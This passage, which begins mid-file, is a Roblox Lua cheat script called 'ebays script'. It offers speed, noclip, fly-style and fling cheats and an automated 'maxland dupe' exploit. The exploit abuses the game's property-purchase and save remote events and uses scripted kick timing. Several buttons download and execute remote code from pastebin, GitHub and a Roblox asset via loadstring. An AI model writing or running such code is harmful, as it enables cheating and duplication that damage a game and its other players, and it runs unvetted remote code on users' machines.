		print("cooldown")
	end
	end
----------------//Getting player names!//-------------------

local player = game.Players.LocalPlayer

function notify(Title,Text)
	game.StarterGui:SetCore("SendNotification", {
		Title = Title,
		Text = Text,
		Duration = 5
	})
end

--function--

function toggleNoClip()
    local disableCollide 
    disableCollide = game:GetService("RunService").Stepped:connect(function()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if noclipping == false then
    disableCollide:Disconnect()
    return
    end
    if v:IsA("BasePart") then
    v.CanCollide = false
    end
    end
    end)
    end


repeat wait()until game:IsLoaded()and game.Players.LocalPlayer.Character;

local name = players.LocalPlayer.Name

local jk = Instance.new("Message")



local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "ebays script                                         Version ".. scriptver, HidePremium = false, SaveConfig = true, ConfigFolder = "ebays script", IntroText = "ebays script", IntroIcon = "https://i.e-z.host/nbo558hv.png"})

local Tab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Player"
})

Tab:AddSlider({
	Name = "Walkspeed",
	Min = 16,
	Max = 500,
	Default = 16,
	Color = Color3.fromRGB(0,0,0),
	Increment = 1,
	ValueName = "",
	Callback = function(new)
		Walkspeed(new)
	end    
})


Tab:AddSlider({
	Name = "Jumppower",
	Min = 50,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(0,0,0),
	Increment = 1,
	ValueName = "",
	Callback = function(new)
		Jumppower(new)
	end    
})

local Section = Tab:AddSection({
	Name = "Character"
})

Tab:AddToggle({
	Name = "Noclip",
	Default = false,
	Callback = function(value)
		if value == true then
            noclipping = true
            toggleNoClip()
            Log("Noclip loaded", 0,0,0, tostring(gFont))
            elseif value == false then
            noclipping = false
            toggleNoClip()
            Log("Noclip unloaded", 0,0,0, tostring(gFont))
            end
	end    
})


Tab:AddToggle({
	Name = "Infinite jump",
	Default = false,
	Callback = function(value)
		if not value then 
            if requirements.connections.infJump then 
                requirements.connections.infJump:Disconnect();
                requirements.connections.infJump=nil;
                requirements.Booleans.infJumpEnabled=false;
            end;
            Log("Infinite Jump unloaded", 0,0,0, tostring(gFont))
        elseif value then 
            requirements.connections.infJump=requirements.services.userInputService.JumpRequest:Connect(function()
                requirements.LP.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping);
            end)
            requirements.Booleans.infJumpEnabled=true;
            Log("Infinite Jump loaded", 0,0,0, tostring(gFont))
        end;
	end    
})

Tab:AddSlider({
	Name = "FOV",
	Min = 70,
	Max = 170,
	Default = 70,
	Color = Color3.fromRGB(0,0,0),
	Increment = 1,
	ValueName = "",
	Callback = function(fov)
        game.Workspace.Camera.FieldOfView = fov --efef
	end
})

Tab:AddButton({
	Name = "Reset FOV",
	Callback = function()
        game.Workspace.Camera.FieldOfView = 70
  	end    
})

Tab:AddButton({
	Name = "Sky launch",
	Callback = function()
        game.Players.LocalPlayer.Character.Humanoid.HipHeight = "300"
  	end    
})
Tab:AddButton({
	Name = "Sit",
	Callback = function()
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
  	end    
})
Tab:AddButton({
	Name = "Reset",
	Callback = function()
        game.Players.LocalPlayer.Character.Head:Destroy()
  	end    
})

Tab:AddToggle({
	Name = "Light",
	Default = false,
	Callback = function(b)
        if b then 
            functions.applyLight(true);
        else
            functions.applyLight();
        end;
        requirements.ConfigSetup.light=b
    end,
    requirements.ConfigSetup.light    
})

local Section = Tab:AddSection({
	Name = "Extra"
})

Tab:AddButton({
	Name = "Btools",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/Lf1ySa1m", true))()
  	end    
})

Tab:AddButton({
	Name = "Hard dragger",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/DfFmZuR0", true))()
  	end    
})

Tab:AddButton({
	Name = "Rejoin server",
	Callback = function()
        local placeId = "13822889"
	        game:GetService("TeleportService"):Teleport(placeId)
            loadstring(game:HttpGetAsync'https://pastebin.pl/view/raw/eb0bffe7')();
  	end    
})


Tab:AddToggle({
	Name = "Axe fling",
	Default = false,
	Callback = function(state)
        if not state then 
            if requirements.connections.axeFling then 
                requirements.connections.axeFling:Disconnect();
                requirements.connections.axeFling=nil;
            end;
        end;
        if state then 
            functions.axeFling();
        end;
    end,
    false
})

local Tab = Window:MakeTab({
	Name = "World",
	Icon = "rbxassetid://",
	PremiumOnly = false
})

game.Lighting.Changed:connect(function()
    if day then
        game.Lighting.TimeOfDay = "12:00:00"
        game.Lighting.Brightness = 1
    elseif night then
        game.Lighting.TimeOfDay = "24:00:00"
        game.Lighting.Brightness = 0
    end
end)


local Section = Tab:AddSection({
	Name = "Sky options"
})

Tab:AddToggle({
	Name = "Always day",
	Default = false,
	Callback = function(state)
        day = state
    end 
})


Tab:AddToggle({
	Name = "Always night",
	Default = false,
	Callback = function(state)
        night = state
    end 
})


Tab:AddToggle({
	Name = "Shadows",
	Default = false,
	Callback = function(value)
        game.Lighting.GlobalShadows = value
    end 
})


Tab:AddToggle({
	Name = "No fog",
	Default = false,
	Callback = function(value)
        game.Lighting.Changed:connect(function()
            _G.d = value == true 
            while _G.d  do
            game: service"RunService".RenderStepped:wait()
            game.Lighting.FogEnd = 9999
            end
            end)
    end 
})

Tab:AddSlider({
	Name = "Brightness",
	Min = 1,
	Max = 25,
	Default = 1,
	Color = Color3.fromRGB(0,0,0),
	Increment = 1,
	ValueName = "",
	Callback = function(new)
		game.Lighting.Brightness = new
	end    
})

Tab:AddToggle({
	Name = "Better graphics",
	Default = false,
	Callback = function(value)
        if value == true then
            game.Lighting.Brightness = 1
            game.Lighting.ColorCorrection.Saturation = 0.025	
            game.Lighting.ColorCorrection.Contrast = 0.025	
        elseif value == false then
            game.Lighting.Brightness = 0
            game.Lighting.ColorCorrection.Saturation = 0	
            game.Lighting.ColorCorrection.Contrast = 0
            end
    end 
})


Tab:AddToggle({
	Name = "Flashbang mode",
	Default = false,
	Callback = function(value)
        if value == true then
            game.Lighting.Brightness = 4
            game.Lighting.ColorCorrection.Saturation = 1	
            game.Lighting.ColorCorrection.Contrast = 1
        elseif value == false then
            game.Lighting.Brightness = 0
            game.Lighting.ColorCorrection.Saturation = 0	
            game.Lighting.ColorCorrection.Contrast = 0
            end
    end 
})

local Section = Tab:AddSection({
	Name = "Land"
})


Tab:AddToggle({
	Name = "Destroy water",
	Default = false,
	Callback = function(value)
        if value == true then
            for i,v in pairs (game.Workspace.Water:GetChildren()) do
            if v.Name == "Water" then
            v.Transparency = 1
            end
            end
            else
            for i,v in pairs (game.Workspace.Water:GetChildren()) do
            if v.Name == "Water" then
            v.Transparency = 0
            end
            end
            end 
    end 
})

Tab:AddToggle({
	Name = "Destroy Snow Boulder",
	Default = false,
	Callback = function(value)
        if value == true then
            for i,v in pairs(game.Workspace.Region_Snow.PartSpawner:GetChildren()) do
            if v.Name == "Boulder" then
            v.Transparency = 1
            v.CanCollide = false
            end
            end
            else
            for i,v in pairs(game.Workspace.Region_Snow.PartSpawner:GetChildren()) do
            if v.Name == "Boulder" then
            v.Transparency = 0
            v.CanCollide = true
            end
            end
            end
    end 
})


Tab:AddToggle({
	Name = "Destroy Snow",
	Default = false,
	Callback = function(value)
        if value == true then
            for i,v in pairs(game.Workspace.Region_Snow:GetChildren()) do
            if v.Name == "Snow" then
            v.Transparency = 1
            v.CanCollide = true
            end
            end
            else
            for i,v in pairs(game.Workspace.Region_Snow:GetChildren()) do
            if v.Name == "Snow" then
            v.Transparency = 0
            v.CanCollide = false
            end
            end
            end
    end 
})

Tab:AddToggle({
	Name = "Water Walk",
	Default = false,
	Callback = function(value)
        local q = game.Workspace.Water
        for i,v in pairs(q:GetChildren()) do 
        if v.Name == "Water" then
        if value == false then
        v.CanCollide = false
        else if value == true then
        v.CanCollide = true
        end
        end
        end
        end
    end 
})



 






local Tab = Window:MakeTab({
	Name = "Dupe",
	Icon = "rbxassetid://",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Information"
})


Tab:AddSlider({
	Name = "Slot",
	Min = 0,
	Max = 6,
	Default = 0,
	Color = Color3.fromRGB(0,0,0),
	Increment = 1,
	ValueName = "",
	Callback = function(new)
		Slot = tonumber(new)
	end    
})


Tab:AddTextbox({
	Name = "Time to tp to middle",
	Default = "",
	TextDisappear = false,
	Callback = function(new)
		timetotp = tonumber(new)
	end	  
})

Tab:AddTextbox({
	Name = "How much time you would like to take off",
	Default = "",
	TextDisappear = false,
	Callback = function(new)
		timetoremove = tonumber(new)
	end	  
})

local N=game:GetService("VirtualInputManager")

local Section = Tab:AddSection({
	Name = "Maxland dupe auto"
})

Tab:AddButton({
	Name = "Start auto maxland dupe",
	Callback = function()
        Log("Slot loading...", 255,255,255, tostring(gFont))
N:SendKeyEvent(true,"Q",false,game)
wait(0.1) -- free land
N:SendKeyEvent(true,"T",false,game)
wait(0.1) -- loads the base
N:SendKeyEvent(true,"P",false,game) -- kicks from game
Loadslot()
  	end    
})






local Section = Tab:AddSection({
	Name = "Maxland dupe manual"
})

Tab:AddButton({
	Name = "Start manual dupe",
	Callback = function()
        Log('Once on the loading screen press "Max land dupe step 2"', 255,255,255, tostring(gFont))
        Loadslot()
  	end    
})

Tab:AddButton({
	Name = "Manual dupe step 2",
	Callback = function()
        Log('Please now load your plot and press "Max land dupe step 3"', 255,255,255, tostring(gFont))
        FreeLand()
  	end    
})

Tab:AddButton({
	Name = "Manual dupe step 3",
	Callback = function()
        wait(timetotp)
        loadstring(game:GetObjects("rbxassetid://2662507900")[1].Source)()
  	end    
})


local Section = Tab:AddSection({
	Name = "Maxland dupe claim tools"
})

Tab:AddButton({
	Name = "Select plot",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/Wj49DUwL"))()
  	end    
})

Tab:AddButton({
	Name = "Load on selected plot",
	Callback = function()
        for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
            if v:FindFirstChild("OriginSquare") then
                if v.OriginSquare:FindFirstChild("Selection") then
                game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(v,v.OriginSquare.Position)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,2,0)
                break
            end
        end
    end
end
})

Tab:AddButton({
	Name = "Save slot",
	Callback = function()
        local result = false
    repeat
        wait(1)
        getgenv().block_save = false
        local slot_id = game:GetService("Players")["LocalPlayer"]["CurrentSaveSlot"].Value
        result = game.ReplicatedStorage.LoadSaveRequests.RequestSave:InvokeServer(slot_id, game.Players.LocalPlayer)
        Log("Slot saved", 255,255,255, tostring(gFont))
        until result
        getgenv().block_save = true
  	end    
})



local Tab = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Local settings"
})

Tab:AddLabel("Username: " .. game.Players.LocalPlayer.Name)

Tab:AddLabel("Support id: " .. code)

Tab:AddLabel("Version: " .. scriptver)

local Section = Tab:AddSection({
	Name = "Credits"
})

Tab:AddLabel("Main developer: S409#7733")






























OrionLib:Init()

--extra functions---------------------------------------------------------

scr=getsenv(game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient);

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()



bind = "q" 



mouse.KeyDown:connect(function(key)
if key == bind then
    repeat wait()until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
    wait(1)
    wait(0.9)
    for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
        if v:FindFirstChild("Owner") and v.Owner.Value == nil then
        game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(v,v.OriginSquare.Position)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,2,0)
        break
        end
    end
end
end)



local player = game.Players.LocalPlayer
local mouse = player:GetMouse()



bind = "p" 



mouse.KeyDown:connect(function(key)
if key == bind then
    repeat wait()until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
    wait(1)
    wait(2)
    task.wait(timetotp - 2)
    loadstring(game:GetObjects("rbxassetid://2662507900")[1].Source)()
end
end)


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()



bind = "t" 



mouse.KeyDown:connect(function(key)
if key == bind then
    repeat wait()until game.Players.LocalPlayer.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Visible;
    wait(0.3)
    scr.scrollSelection(-1);
    wait(0.1)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
    scr.scrollSelection(-1);
    wait(0.3)
    scr.selectionMade();
    wait(0.3)
    scr.selectionMade();
    wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();
wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();
wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();
wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();
wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();
wait(1)
scr.scrollSelection(-1);
wait(0.3)
scr.selectionMade();
wait(0.3)
scr.selectionMade();                       
end
end)




